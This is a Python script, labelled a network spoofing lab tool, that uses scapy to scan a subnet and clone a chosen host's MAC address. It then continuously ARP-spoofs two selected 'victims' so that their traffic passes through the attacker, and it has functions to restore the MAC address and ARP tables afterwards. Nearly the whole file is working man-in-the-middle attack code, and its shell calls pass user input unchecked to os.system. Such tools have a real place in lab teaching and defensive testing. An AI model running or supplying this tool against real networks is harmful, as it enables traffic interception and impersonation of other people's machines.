#!/usr/bin/env python3
"""
Network Spoofing Lab Tool (with auto-restore Permanent MAC)
"""

import os, sys, time, subprocess
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr

# ==============================
# GLOBAL STATE
# ==============================
spoofed_mac = None
interface = None
arp_targets = {}   # store victims for restore


# ==============================
# HELPER FUNCTIONS
# ==============================
def get_gateway():
    """Get default gateway IP"""
    try:
        result = subprocess.check_output("ip route show default", shell=True).decode()
        gw_ip = result.split()[2]
        return gw_ip
    except Exception:
        return None


def get_perm_mac(iface):
    """Get permanent MAC of interface"""
    try:
        result = subprocess.check_output(f"ethtool -P {iface}", shell=True).decode()
        return result.strip().split()[-1]
    except Exception:
        return None


def scan_network(subnet, iface):
    """Scan subnet to find live hosts"""
    arp_request = ARP(pdst=subnet)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered, _ = srp(packet, timeout=2, iface=iface, verbose=0)

    hosts = []
    for sent, recv in answered:
        hosts.append((recv.psrc, recv.hwsrc))
    return hosts


def change_mac(iface, new_mac):
    """Change MAC address"""
    global spoofed_mac
    os.system(f"sudo ip link set {iface} down")
    os.system(f"sudo ip link set {iface} address {new_mac}")
    os.system(f"sudo ip link set {iface} up")
    spoofed_mac = new_mac
    print(f"[*] MAC of {iface} changed to {new_mac}")


def restore_mac(iface):
    """Restore permanent MAC address"""
    global spoofed_mac
    perm_mac = get_perm_mac(iface)
    if not perm_mac:
        print("[!] Could not detect permanent MAC")
        return
    os.system(f"sudo ip link set {iface} down")
    os.system(f"sudo ip link set {iface} address {perm_mac}")
    os.system(f"sudo ip link set {iface} up")
    spoofed_mac = None
    print(f"[+] MAC of {iface} restored to permanent {perm_mac}")


def arp_spoof(victim1_ip, victim1_mac, victim2_ip, victim2_mac, iface):
    """Send ARP spoof packets"""
    global spoofed_mac, arp_targets
    attacker_mac = spoofed_mac if spoofed_mac else get_if_hwaddr(iface)

    print(f"[*] Attacker MAC = {attacker_mac}")
    print("[*] Starting ARP spoofing... CTRL+C to stop")

    arp_targets = {victim1_ip: victim1_mac, victim2_ip: victim2_mac}

    try:
        while True:
            pkt1 = Ether(dst=victim1_mac)/ARP(op=2, pdst=victim1_ip, hwdst=victim1_mac,
                                             psrc=victim2_ip, hwsrc=attacker_mac)
            pkt2 = Ether(dst=victim2_mac)/ARP(op=2, pdst=victim2_ip, hwdst=victim2_mac,
                                             psrc=victim1_ip, hwsrc=attacker_mac)
            sendp(pkt1, iface=iface, verbose=0)
            sendp(pkt2, iface=iface, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopped ARP spoofing. Use option 3 to restore ARP tables.")


def restore_arp(iface):
    """Restore ARP tables of victims"""
    global arp_targets
    if len(arp_targets) < 2:
        print("[!] No ARP targets stored. Run spoofing first.")
        return
    v1, v2 = list(arp_targets.keys())
    v1_mac, v2_mac = arp_targets[v1], arp_targets[v2]

    pkt1 = Ether(dst=v1_mac)/ARP(op=2, pdst=v1, hwdst=v1_mac, psrc=v2, hwsrc=v2_mac)
    pkt2 = Ether(dst=v2_mac)/ARP(op=2, pdst=v2, hwdst=v2_mac, psrc=v1, hwsrc=v1_mac)
    sendp(pkt1, count=5, iface=iface, verbose=0)
    sendp(pkt2, count=5, iface=iface, verbose=0)
    print("[+] ARP tables restored")


# ==============================
# MAIN MENU
# ==============================
def menu():
    global interface
    while True:
        print("\n===== NETWORK SPOOF LAB =====")
        print("1. MAC Spoofing")
        print("2. ARP Spoofing")
        print("3. Restore (MAC + ARP)")
        print("4. Quit")

        choice = input("Select option: ").strip()

        if choice == "1":
            iface = input("Enter interface (e.g., eth1): ").strip()
            subnet = input("Enter subnet (e.g., 192.168.48.0/24): ").strip()
            hosts = scan_network(subnet, iface)
            gateway_ip = get_gateway()

            if not hosts:
                print("[!] No hosts found")
                continue

            print("\nDetected hosts:")
            for i, (ip, mac) in enumerate(hosts, 1):
                tag = " [GATEWAY]" if gateway_ip and ip == gateway_ip else ""
                print(f"[{i}] {ip}\t{mac}{tag}")

            sel = int(input("Choose target number to spoof: "))
            target_ip, target_mac = hosts[sel - 1]

            change_mac(iface, target_mac)
            interface = iface

        elif choice == "2":
            if not interface:
                interface = input("Enter interface (e.g., eth1): ").strip()
            subnet = input("Enter subnet (e.g., 192.168.48.0/24): ").strip()
            hosts = scan_network(subnet, interface)
            gateway_ip = get_gateway()

            if len(hosts) < 2:
                print("[!] Need at least 2 victims")
                continue

            print("\nDetected hosts:")
            for i, (ip, mac) in enumerate(hosts, 1):
                tag = " [GATEWAY]" if gateway_ip and ip == gateway_ip else ""
                print(f"[{i}] {ip}\t{mac}{tag}")

            sel1 = int(input("Choose Victim 1: "))
            sel2 = int(input("Choose Victim 2: "))
            v1_ip, v1_mac = hosts[sel1 - 1]
            v2_ip, v2_mac = hosts[sel2 - 1]

            arp_spoof(v1_ip, v1_mac, v2_ip, v2_mac, interface)

        elif choice == "3":
            if interface:
                restore_mac(interface)
                restore_arp(interface)
            else:
                print("[!] No interface in use")

        elif choice == "4":
            print("[*] Exiting...")
            break
        else:
            print("[!] Invalid choice")


# ==============================
# ENTRY POINT
# ==============================
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Must run as root (sudo)")
        sys.exit(1)
    menu()
